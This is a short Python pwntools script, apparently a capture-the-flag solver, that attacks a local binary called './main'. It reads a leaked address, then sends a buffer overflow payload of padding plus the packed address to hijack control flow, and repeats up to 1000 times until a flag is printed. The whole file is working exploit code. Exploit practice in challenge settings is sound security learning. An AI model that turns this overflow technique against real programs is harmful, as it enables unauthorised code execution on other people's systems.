from pwn import *
import random

# context.log_level = 'debug'

flag = ''

for _ in range(1000):

	conn = process('./main')

	line = conn.recvlineS().strip()
	address = line.lstrip('👀: ')
	address = int(address, 16)

	conn.recvuntil('can you guess the position?\n')

	# rand = random.randint(0, 20)
	rand = 5

	payload = b'A' * (56 - rand) + p64(address)

	conn.sendline(payload)

	line = conn.recvline()
	flag = conn.recvallS()

	conn.close()

	if len(flag) > 5:
		break

print(flag)